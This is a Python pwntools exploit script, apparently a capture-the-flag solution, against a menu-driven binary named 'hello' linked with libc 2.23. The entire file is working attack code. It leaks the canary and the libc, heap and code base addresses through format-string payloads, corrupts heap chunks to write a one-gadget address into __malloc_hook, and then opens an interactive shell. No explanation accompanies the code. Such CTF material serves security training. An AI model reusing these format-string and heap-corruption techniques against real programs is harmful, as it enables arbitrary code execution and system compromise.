#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'

libc = ELF('./libc-2.23.so')
elf = ELF('./hello')

DEBUG = 1
if DEBUG:
	p = process('./hello')
else:
	p = remote('', 66666)

def debug():
	gdb.attach(p)
	pause()

def pr(addr_name, addr):
	log.success(addr_name + ': ' + hex(addr))

def add(length,name,content):
	p.sendlineafter('>>',b'1')
	p.sendlineafter('phone number:',b'%p.%p.%p..')
	p.sendlineafter('name:',name)
	p.sendlineafter('input des size:',str(length))
	p.sendlineafter('des info:',content)

def delete(idx):
	p.sendlineafter('>>',b'2')
	p.sendlineafter('input index:',str(idx))
	p.recvuntil('delete sucess!\n')

def edit(idx,name,content):
	p.sendlineafter('>>','4')
	p.sendlineafter('input index:',str(idx))
	p.sendlineafter('phone number:',b'a'*0xa)
	p.sendlineafter('name:',name)
	p.sendafter('des info:',content)

def show(idx):
	p.sendlineafter('>>',b'3')
	p.sendlineafter('input index:',str(idx))
	p.recvuntil('number:')

add(0x60,b'1'*13,b'1') #0

show(0)
canary = int(p.recv(14),16)+0x2698
p.recv(7)
libcbase = int(p.recv(14),16)-0xf73c0
p.recvuntil(b'1'*13)
heapbase = u64(p.recv(6).ljust(8,b"\x00")) - 0x10

__malloc_hook = libcbase + libc.sym['__malloc_hook']
_IO_2_1_stdin_ = libcbase + 0x3c48e0
og = libcbase + [0x4527a,0xf03a4,0xf1247][2]
pr('stack',canary)
pr('heapbase',heapbase)
pr('libcbase',libcbase)
pr('__malloc_hook',__malloc_hook)
pr('_IO_2_1_stdin_',_IO_2_1_stdin_)

myformat = b'%9$p'
p.sendlineafter('>>',b'1')
p.sendlineafter('phone number:',myformat)
p.sendlineafter('name:',b'2'*12)
p.sendlineafter('input des size:',str(0x60))
p.sendlineafter('des info:',b'2')

show(1)
codebase = int(p.recv(14),16)-0x1274
idx_addr = codebase + 0x2020BC
pr('codebase',codebase)
pr('idx_addr',idx_addr)

delete(0)
edit(1,b'2'*13+p64(heapbase+0x10),p64(idx_addr-0x1f))

add(0x60,b'3'*12,b'3') #2 use0
add(0x60,b'4'*12,b'4') #3

payload = b'\x34\x00\x00' + p64(_IO_2_1_stdin_) + b'\x00'*4 + b'\x00'
edit(3,b'4'*12,payload)

delete(2)

edit(1,b'2'*13+p64(heapbase+0x10),p64(__malloc_hook-0x23))
add(0x60,b'5'*12,b'5') #0 use0
add(0x60,b'6'*12,b'6') #1

#debug()
edit(1,b'6'*12,b'\x00'*0x13+p64(og))
#debug()

p.sendlineafter('>>',b'1')
p.sendlineafter('phone number:',b'11')
p.sendlineafter('name:',b'11')
p.sendlineafter('input des size:',str(0x60))

p.interactive()